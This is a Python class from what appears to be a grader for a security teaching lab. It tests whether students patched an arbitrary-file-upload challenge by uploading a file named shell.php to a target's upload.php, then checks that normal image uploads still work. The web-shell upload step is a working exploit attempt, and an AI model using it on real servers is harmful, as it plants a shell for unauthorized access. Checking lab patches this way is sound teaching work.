import requests
from Exploit import Exploit
import BetterLogger
from BetterLogger import logger

class ChallengeTwoUpload(Exploit):
	def __init__(self, ip_address, parsed_config) -> None:
		super().__init__(ip_address=ip_address, parsed_config=parsed_config)

	def upload_file_to_server(self, file_name):
		url = f"http://{self.ip_address}/arbitrary_file_upload/upload.php"
		logger.info(f"{self.ip_address} - Uploading `{file_name}`...")
		file_to_upload = {'image': open(file_name, 'rb')}
		server_response = requests.post(url, files=file_to_upload, timeout=3)
		server_response_text = server_response.text
		if "Success" in server_response_text:
			logger.debug(f"{self.ip_address} - Successfully uploaded `{file_name}`.")
			return True
		logger.info(f"{self.ip_address} - Failed to upload `{file_name}`.")
		return False

	def upload_normal_image(self):
		return self.upload_file_to_server(file_name="./exploits/challenge2/1234.png")

	def upload_shell_php(self):
		return self.upload_file_to_server(file_name="./exploits/challenge2/shell.php")
	
	def run_custom_command(self, command):
		raise NotImplementedError

	def test_if_vulnerable(self):
		"""
		Returns True if vulnerable and False if not
		"""
		try:
			logger.info(f"{self.ip_address} - Testing if the target is vulnerable to ChallengeTwoUpload...")
			uploaded_shell_php = self.upload_shell_php()
			if uploaded_shell_php:
				logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to ChallengeTwoUpload!{BetterLogger.COLOR_END}")
				return True
			else:
				uploaded_normal_image = self.upload_normal_image()
				if not uploaded_normal_image:
					logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - The student incorrectly patched ChallengeTwoUpload so images cannot be uploaded!{BetterLogger.COLOR_END}")
					return False
				logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeTwoUpload.{BetterLogger.COLOR_END}")
				return False
		except requests.ConnectionError:
			logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - The apache2 service is not running!{BetterLogger.COLOR_END}")
			return False
		except Exception as err:
			logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while checking if ChallengeTwoUpload is vulnerable.{BetterLogger.COLOR_END}")
			logger.exception(err)
			return False
